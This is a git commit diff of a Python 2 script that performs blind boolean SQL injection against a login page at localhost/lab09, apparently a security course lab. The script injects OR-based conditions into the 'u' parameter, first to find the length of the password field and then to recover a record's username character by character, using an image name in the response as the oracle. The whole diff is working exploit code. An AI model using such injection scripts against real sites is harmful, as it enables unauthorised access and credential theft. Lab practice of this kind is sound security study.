85c497f0992fbee45046d2b589dbe60baa9e9b34
Ny4nc4t <>
2019-05-16 14:41:59 +0200

    qw

--- script.py
+++ script.py
@@ -16,22 +16,28 @@ request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBS
 
 
 ################################# Loop to get field's size
-
-for x in xrange(0,40):
-	request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20length(password)%20=%20" + str(x) + "--%20"
+size = 0;
+for s in xrange(0,40):
+	request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20length(password)%20=%20" + str(s) + "--%20"
 	f = urllib.urlopen(request)
 	response = f.read()
 	if (response.find('cat.JPG')!=-1): 
-		print "found size : %s" %x
-
-for x in xrange(0,128):
-	request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(username,1,1)%20=%20%27" + chr(x) + "%27%20--%20" 
-	f = urllib.urlopen(request)
-	response = f.read()
-	if (response.find('cat.JPG')!=-1): 
-		print "found letter %s" %chr(x)
+		print "found size : %s" %s
+		size = s
 		break
 
-f = urllib.urlopen(request)
-print "1" + f.geturl()
-print "2" + f.read()
+for pos in xrange(0,size):
+
+	for c in xrange(0,128):
+		request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(username,"+ str(pos) +",1)%20=%20%27" + chr(c) + "%27%20--%20" 
+		f = urllib.urlopen(request)
+		response = f.read()
+		if (response.find('cat.JPG')!=-1): 
+			print "found letter %s at position %d" %(chr(c),pos)
+			break
+
+
+
+# f = urllib.urlopen(request)
+# print "1" + f.geturl()
+# print "2" + f.read()
